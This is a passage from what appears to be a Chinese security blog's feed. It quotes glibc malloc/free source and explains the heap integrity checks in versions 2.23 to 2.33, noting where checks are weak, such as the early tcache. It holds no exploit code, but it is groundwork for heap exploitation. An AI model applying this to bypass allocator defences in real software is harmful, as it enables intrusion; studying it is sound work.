class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>smallbin</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line"> <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"> <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">   &#123;</span><br><span class="line">     mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">     <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在一个链中取出chunk后如果该链还有剩余chunk,且tcache对应链表有空闲位置,则将剩余chunk移入tcache中</p><h3 id="unsortedbin取出受tcache影响"><a href="#unsortedbin取出受tcache影响" class="headerlink" title="unsortedbin取出受tcache影响"></a>unsortedbin取出受tcache影响</h3><ol><li>依然还是先尝试使用last_remainer分配并返回</li><li>但之后如果找到了大小刚好合适的victim也会先放入tcache中,如果tcache满了则直接返回</li><li>如果大小不合适则是依然放入到对应bin中</li><li>如果所需要chunk已被找到并放入tcache,那么在处理完一定数量的chunk后会直接结束循环,并从tcache返回所需要的chunk</li><li>如果所有的chunk都被处理完,并且之前有找到所需要的chunk则返回tcache中的chunk</li></ol><h2 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h2><h3 id="libc-free则没有添加tache相关"><a href="#libc-free则没有添加tache相关" class="headerlink" title="_libc_free则没有添加tache相关"></a>_libc_free则没有添加tache相关</h3><h3 id="free会首先尝试放入tcache"><a href="#free会首先尝试放入tcache" class="headerlink" title="free会首先尝试放入tcache"></a>free会首先尝试放入tcache</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &#123;</span><br><span class="line">   <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">     &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h1><h2 id="malloc没有较大变化"><a href="#malloc没有较大变化" class="headerlink" title="malloc没有较大变化"></a>malloc没有较大变化</h2><h2 id="free没有较大变化"><a href="#free没有较大变化" class="headerlink" title="free没有较大变化"></a>free没有较大变化</h2><h2 id="tcache本身变化"><a href="#tcache本身变化" class="headerlink" title="tcache本身变化"></a>tcache本身变化</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>成员多了个key,get和put函数也多了一些对应的操作</p><h1 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h1><h2 id="malloc照旧"><a href="#malloc照旧" class="headerlink" title="malloc照旧"></a>malloc照旧</h2><h2 id="free照旧"><a href="#free照旧" class="headerlink" title="free照旧"></a>free照旧</h2><h1 id="glibc2-33"><a href="#glibc2-33" class="headerlink" title="glibc2.33"></a>glibc2.33</h1><h2 id="malloc照旧-1"><a href="#malloc照旧-1" class="headerlink" title="malloc照旧"></a>malloc照旧</h2><h2 id="free照旧-1"><a href="#free照旧-1" class="headerlink" title="free照旧"></a>free照旧</h2>]]></content>
    
    
    <summary type="html">一些操作实现的不同</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="glibc" scheme="https://ixout.github.io/tags/glibc/"/>
    
  </entry>
  
  <entry>
    <title>malloc/free安全检查</title>
    <link href="https://ixout.github.io/posts/25293/"/>
    <id>https://ixout.github.io/posts/25293/</id>
    <published>2023-07-29T07:40:32.000Z</published>
    <updated>2023-08-01T13:42:26.191Z</updated>
    
    <content type="html"><![CDATA[<span class='p black'>在不同的glibc下</span><p>分为两篇,一篇记录安全检测,一篇记录操作变化</p><h1 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h1><p><strong>现在看来,2.23已经是一个比较老的版本了,比它更早的版本暂时不做关注,2.23是一个十分经典的版本,以它为基础先概览各类检查</strong></p><h2 id="malloc-realloc"><a href="#malloc-realloc" class="headerlink" title="malloc(realloc)"></a>malloc(realloc)</h2><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p><strong>size检查fastbin01</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>取出fastbin时,通过该chunk计算出的fastbin索引是否与该chunk所在的链的索引相同,即大小是否对应</p><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><h4 id="size检查unsortedbin01"><a href="#size检查unsortedbin01" class="headerlink" title="size检查unsortedbin01"></a>size检查unsortedbin01</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>检查从unsortedbin中取出的chunk的size是否合规</p><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h4 id="完整性检查unlink01"><a href="#完整性检查unlink01" class="headerlink" title="完整性检查unlink01"></a><strong>完整性检查unlink01</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>操作chunk的上一个的下一个和下一个的上一个是否都等于该chunk</p><h4 id="完整性检查-largebin-unlink02"><a href="#完整性检查-largebin-unlink02" class="headerlink" title="完整性检查(largebin)unlink02"></a>完整性检查(largebin)unlink02</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">     malloc_printerr (check_action,      \</span><br><span class="line">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">       P, AV);</span><br></pre></td></tr></table></figure><p>和unlink01类似,不过检查的是largebin的nextsize链</p><h3 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h3><h4 id="realloc01"><a href="#realloc01" class="headerlink" title="realloc01"></a>realloc01</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) oldp &gt; (<span class="type">uintptr_t</span>) -oldsize, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (oldp), <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;realloc(): invalid pointer&quot;</span>, oldmem,</span><br><span class="line">       ar_ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol><li><code>(uintptr_t) oldp &gt; (uintptr_t) -oldsize</code>：这部分代码检查<code>oldp</code>指针是否在有效范围内。它将<code>oldp</code>指针强制转换为无符号整数类型（<code>uintptr_t</code>），然后与<code>-oldsize</code>的负值的二进制补码表示进行比较。这个比较用于检测<code>oldp</code>指针是否在或接近最大可能地址，这可能表明该指针是无效的或者存在损坏。</li><li><code>(misaligned_chunk (oldp)</code>原指针是否对齐</li></ol><h4 id="realloc02"><a href="#realloc02" class="headerlink" title="realloc02"></a>realloc02</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (oldp-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (oldsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;realloc(): invalid old size&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (oldp), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>检查原来的chunk的size是否合规</p><h3 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h3><h4 id="sysmalloc01"><a href="#sysmalloc01" class="headerlink" title="sysmalloc01"></a>sysmalloc01</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span></span><br><span class="line">    malloc_printerr (<span class="number">3</span>, <span class="string">&quot;break adjusted to free malloc space&quot;</span>, brk,</span><br><span class="line">av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>暂时未知</p><h3 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h3><h4 id="munmap-chunk01"><a href="#munmap-chunk01" class="headerlink" title="munmap_chunk01"></a>munmap_chunk01</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (((block | total_size) &amp; (GLRO (dl_pagesize) - <span class="number">1</span>)) != <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;munmap_chunk(): invalid pointer&quot;</span>,</span><br><span class="line">                     chunk2mem (p), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>暂时未知</p><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="free01"><a href="#free01" class="headerlink" title="free01"></a>free01</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">      (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>free的chunk的地址是否合规,是否对齐</p><h4 id="free02"><a href="#free02" class="headerlink" title="free02"></a>free02</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>free的chunk的size是否合规对齐</p><h3 id="free03-fastbin"><a href="#free03-fastbin" class="headerlink" title="free03(fastbin)"></a>free03(fastbin)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;</span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>free的chunk的下一个chunk的size是否合规</p><h3 id="free04-fastbin"><a href="#free04-fastbin" class="headerlink" title="free04(fastbin)"></a>free04(fastbin)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>上一次free的chunk与这一次的是否相同,即是否double free</p><h3 id="free05-fastbin"><a href="#free05-fastbin" class="headerlink" title="free05(fastbin)"></a>free05(fastbin)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding</p><h3 id="free06"><a href="#free06" class="headerlink" title="free06"></a>free06</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>释放的chunk为topchunk</p><h3 id="free07"><a href="#free07" class="headerlink" title="free07"></a>free07</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>下一个chunk是否超出堆的界限</p><h3 id="free08"><a href="#free08" class="headerlink" title="free08"></a>free08</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>释放的chunk之前并不处于使用状态</p><h3 id="free09"><a href="#free09" class="headerlink" title="free09"></a>free09</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>nextchunk的size是否合规</p><h3 id="free10"><a href="#free10" class="headerlink" title="free10"></a>free10</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unsortedbin链头是否完整,<strong>这个检查有三处:</strong></p><ol><li>是unsortedbin往外取切割检查</li><li>是unsortedbin处理后依然找不到在大chunk中切割时检查</li><li>是free时即将放入unsortedbin时存在一次检查</li></ol><h1 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h1><p>glibc2.23-2.27之间的版本比较少见,变化只看2.27与2.23比较,此外主要是在2.26加入了tcachebin</p><h2 id="malloc检查变化"><a href="#malloc检查变化" class="headerlink" title="malloc检查变化"></a>malloc检查变化</h2><h3 id="unlink增加一个检查unlink03"><a href="#unlink增加一个检查unlink03" class="headerlink" title="unlink增加一个检查unlink03"></a>unlink增加一个检查unlink03</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>); </span><br></pre></td></tr></table></figure><p>检查通过该chunk的size找到的nextchunk的prev_size是否等于该chunk的size,unlink不会检查通过prev_size找到的该chunk的size是否等于那个prev_size</p><h3 id="取出smallbin新增一个检查"><a href="#取出smallbin新增一个检查" class="headerlink" title="取出smallbin新增一个检查"></a>取出smallbin新增一个检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">   malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查smallbin链表尾是否完整</p><h3 id="malloc-consolidate新增检查"><a href="#malloc-consolidate新增检查" class="headerlink" title="malloc_consolidate新增检查"></a>malloc_consolidate新增检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line"> fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line"> <span class="keyword">do</span> &#123;</span><br><span class="line">   p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);<span class="comment">//将fastbinsY[0]的值存储在p中然后清空</span></span><br><span class="line">   <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;<span class="comment">//p不为0,那么就说明存在chunk</span></span><br><span class="line">     <span class="keyword">do</span> &#123;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查p指向chunk索引对应的fastbin链表头部指针是否等于fb。如果不相等，说明fastbin链表的头部指针被修改了，这可能表明发生了错误或者内存数据结构遭到破坏。</p><p>其实就是检查idx是不是等于0</p><h3 id="新增宏REMOVE-FB-删除fastbin-chunk-索引检测"><a href="#新增宏REMOVE-FB-删除fastbin-chunk-索引检测" class="headerlink" title="新增宏REMOVE_FB(删除fastbin_chunk)索引检测"></a>新增宏REMOVE_FB(删除fastbin_chunk)索引检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br></pre></td></tr></table></figure><p>移除fastbin_chunk的时候,检测victim的size计算出的idx与该所在链的索引是否相等</p><h2 id="free检查变化"><a href="#free检查变化" class="headerlink" title="free检查变化"></a>free检查变化</h2><p>free似乎没有什么变化,新加入的tcache十分脆弱,几乎没有任何检查</p><h1 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h1><h2 id="malloc变化"><a href="#malloc变化" class="headerlink" title="malloc变化"></a>malloc变化</h2><h3 id="unsortedbin取出检查较大变化"><a href="#unsortedbin取出检查较大变化" class="headerlink" title="unsortedbin取出检查较大变化"></a>unsortedbin取出检查较大变化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><p>除了之前就存在的对victim的size检查外,新增:</p><ol><li>对nextchunk的size的检查</li><li>对nextchunk的prev_size与victim的size是否相等的检查</li><li>因为FIFO,对victim的下一个chunk是否时链表头进行检查</li><li>对victim的nextchunk的prev_inuse位检查,是否合理</li></ol><h3 id="unsortedbin移除chunk新增检查"><a href="#unsortedbin移除chunk新增检查" class="headerlink" title="unsortedbin移除chunk新增检查"></a>unsortedbin移除chunk新增检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 